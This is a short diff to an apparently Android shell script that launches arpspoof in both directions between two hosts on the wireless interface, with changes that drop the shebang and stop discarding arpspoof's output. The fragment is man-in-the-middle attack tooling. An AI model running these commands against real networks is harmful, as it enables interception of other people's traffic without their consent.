@@ -1,4 +1,4 @@
-#!/system/bin/sh
+
 # When this script the following are set by the . command:
 # WLAN, IP, SUBNET, MASK, SHORTMASK
 # ARPSPOOF, IPTABLES
@@ -26,10 +26,10 @@ then
 else
 	echo "Starting ARP Spoofing"
 	echo arpspoof -i $WLAN -t "$1" "$2"
-	$ARPSPOOF -i $WLAN -t "$1" "$2" 2>&1 >/dev/null &
+	$ARPSPOOF -i $WLAN -t "$1" "$2" &
 	ARP1="$!"
 	echo arpspoof -i $WLAN -t "$2" "$1"
-	$ARPSPOOF -i $WLAN -t "$2" "$1" 2>&1 >/dev/null &
+	$ARPSPOOF -i $WLAN -t "$2" "$1" &
 	ARP2="$!"
 fi
 
